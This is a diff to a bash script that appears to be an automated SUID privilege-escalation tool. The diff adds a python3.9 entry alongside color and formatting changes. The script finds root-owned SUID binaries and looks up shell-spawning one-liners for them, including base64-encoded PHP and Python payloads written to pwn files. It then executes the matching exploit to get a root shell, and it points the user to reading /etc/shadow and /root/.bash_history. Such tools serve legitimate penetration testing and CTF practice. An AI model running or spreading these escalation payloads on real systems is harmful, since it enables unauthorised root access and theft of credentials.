@@ -24,10 +24,10 @@
 version="1.12"
 releasedate="November 30, 2021"
 updatedate="December 8, 2021"
-suidlist=(ar arj arp as ash atobm awk base32 base64 basenc bash bridge busybox bzip2 capsh cat chmod chown chroot cmp column comm cp cpio cpulimit csh csplit csvtool cupsfilter curl cut dash date dd dialog diff dig dmsetup docker dosbox ed emacs env eqn expand expect file find flock fmt fold gawk gcore gdb gimp grep gtester gzip hd head hexdump highlight hping3 iconv install ionice ip jjs join jq jrunscript ksh ksshell ld.so less logsave look lua make mawk more msgattrib msgcat msgconv msgfilter msgmerge msguniq mv nasm nawk nice nl nmap node nohup od openssl openvpn paste perf perl pg php pr python readelf restic rev rlwrap rsync run-parts rview rvim sed setarch shuf soelim sort sqlite3 ss ssh-keygen ssh-keyscan start-stop-daemon stdbuf strace strings sysctl systemctl tac tail taskset tbl tclsh tee tftp tic time timeout troff ul unexpand uniq unshare update-alternatives uudecode uuencode view vigr vim vimdiff vipw watch wc wget whiptail xargs xmodmap xmore xxd xz zsh zsoelim);
+suidlist=(ar arj arp as ash atobm awk base32 base64 basenc bash bridge busybox bzip2 capsh cat chmod chown chroot cmp column comm cp cpio cpulimit csh csplit csvtool cupsfilter curl cut dash date dd dialog diff dig dmsetup docker dosbox ed emacs env eqn expand expect file find flock fmt fold gawk gcore gdb gimp grep gtester gzip hd head hexdump highlight hping3 iconv install ionice ip jjs join jq jrunscript ksh ksshell ld.so less logsave look lua make mawk more msgattrib msgcat msgconv msgfilter msgmerge msguniq mv nasm nawk nice nl nmap node nohup od openssl openvpn paste perf perl pg php pr python python3.9 readelf restic rev rlwrap rsync run-parts rview rvim sed setarch shuf soelim sort sqlite3 ss ssh-keygen ssh-keyscan start-stop-daemon stdbuf strace strings sysctl systemctl tac tail taskset tbl tclsh tee tftp tic time timeout troff ul unexpand uniq unshare update-alternatives uudecode uuencode view vigr vim vimdiff vipw watch wc wget whiptail xargs xmodmap xmore xxd xz zsh zsoelim);
 restrictedfile="/etc/shadow"
 suidlistcount=${#suidlist[@]}; # Count the output
-rootsuidlist=(bash zsh ash capsh chroot cpulimit csh dash env expect find flock ionice ksh ld.so logsave nice node nohup php python setarch start-stop-daemon stdbuf strace taskset xargs tclsh time timeout unshare run-parts rview rvim view vim vimdiff);
+rootsuidlist=(bash zsh ash capsh chroot cpulimit csh dash env expect find flock ionice ksh ld.so logsave nice node nohup php python python3.9 setarch start-stop-daemon stdbuf strace taskset xargs tclsh time timeout unshare run-parts rview rvim view vim vimdiff);
 
 # SUID library
 declare -A suidlibrary=(
@@ -74,6 +74,7 @@ declare -A suidlibrary=(
 	[php]="Privilege escalation: ./php -r \"pcntl_exec('/bin/sh', ['-p']);\""
 	[php_cmd]="-f $(echo PD9waHAKcGNudGxfZXhlYygnL2Jpbi9zaCcsIFsnLXAnXSk7Cj8+ | base64 -d > pwn_php.me; echo pwn_php.me)"
 	[python]="Privilege escalation: ./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+	[python3.9]="Privilege escalation: ./python3.9 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
 	[python_cmd]="$(echo aW1wb3J0IG9zOyBvcy5leGVjbCgiL2Jpbi9zaCIsICJzaCIsICItcCIp | base64 -d > pwn_python.me; echo pwn_python.me)"
 	[setarch]="Privilege escalation: ./setarch $(arch) /bin/sh -p"
 	[setarch_cmd]="$(arch) /bin/sh -p"
@@ -272,7 +273,7 @@ msg_box() {
     done
 
     # draw box
-    printf '%s╔' "${orange}" &&  printf '%.0s═' {0..79} && printf '╗\n' && printf '│%79s │\n' " "
+    printf '%s╔' "${orange}" &&  printf '%.0s═' {0..79} && printf '╗\n' && printf '║%79s ║\n' " "
 
     for line in "${str[@]}"; do
         rpad=$((80 - "${pad}" - "${msg_width}")) # make sure to close with width 80
@@ -295,7 +296,7 @@ printf  "";
 
 ## Find the SUID files
 printf  "%s[ ! ]%s Running the command to find SUID files\n" "${orange}" "${reset}"
-printf  "%s[ * * ]%s%s find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null%s\n" "${blue}" "${reset}" "${green}" "${reset}"
+printf  "%s[ * * ]%s%s find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null%s\n" "${cyan}" "${reset}" "${green}" "${reset}"
 suidArray=$(find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null); # Harvesting SUID files
 
 ## Check if there are no related files
@@ -327,8 +328,8 @@ printf  "%s[ + ]%s We have found at least %s%s%s potential SUID exploitable file
 for suidexploitable in "${exploitablesuidarray[@]}"; do
 	suidcommand=$(echo "${suidexploitable}" | awk -F "/" '{print $NF}'); # clear the path
 	suidexplanation=$(echo "${suidlibrary[$suidcommand]}");
-	printf  "\n%s[ * * ]%s %s\n" ${blue} ${reset} ${suidexploitable} "${blue}"
-	printf  "%s[ Explanation ]%s %s%s%s\n" "${blue}" "${reset}" "${green}" "${suidexplanation}" "${reset}"
+	printf  "\n%s[ * * ]%s %s\n" ${cyan} ${reset} ${suidexploitable} "${cyan}"
+	printf  "%s[ Explanation ]%s %s%s%s\n" "${cyan}" "${reset}" "${green}" "${suidexplanation}" "${reset}"
 done
 
 ## The further attack explanation
@@ -341,10 +342,11 @@ do
 		if [ $suidcommand == $suidSelect ]
 			then
 			wehavesuidtoroot=true;
-			printf  "%s[ * * ]%s We have found %s%s SUID%s file. Trying to get root" "${blue}" "${reset}" "${red}" "${suidSelect}" "${reset}"
+			printf  "%s[ * * ]%s We have found %s%s SUID%s file. Trying to get root\n" "${cyan}" "${reset}" "${red}" "${suidSelect}" "${reset}"
 			keys=$(echo $suidSelect"_cmd");
-			exploit=$(echo $suidexploitable ${suidlibrary[$keys]});
-			printf  "%s[ * * ]%s Executing %s%s%s" "${blue}" "${reset}" "${red}" "${exploit}" "${reset}"
+			exploit=$(echo "$suidexploitable" "${suidlibrary[$keys]}");
+			echo "$suidexploitable" "${suidlibrary[$keys]}"
+			printf  "%s[ * * ]%s Executing %s%s%s\n" "${cyan}" "${reset}" "${red}" "${exploit}" "${reset}"
 			$exploit;
 		fi;
 	done
@@ -355,5 +357,5 @@ done
 rm pwn*
 
 if [ ! $wehavesuidtoroot ]; then
-    printf  "%s[ * * ]%s Seems like there are no privilege escalation files through SUID in the system. Follow the instructions above to read the restricted files, eg. %s/etc/shadow%s or %s/root/.bash_history%s, or perform other high privileges commands. P.s. think outside the box to pivot into the root ;)" "${blue}" "${reset}" "${red}" "${reset}" "${red}" "${reset}"
+    printf  "%s[ * * ]%s Seems like there are no privilege escalation files through SUID in the system. Follow the instructions above to read the restricted files, eg. %s/etc/shadow%s or %s/root/.bash_history%s, or perform other high privileges commands. P.s. think outside the box to pivot into the root ;)" "${cyan}" "${reset}" "${red}" "${reset}" "${red}" "${reset}"
 fi
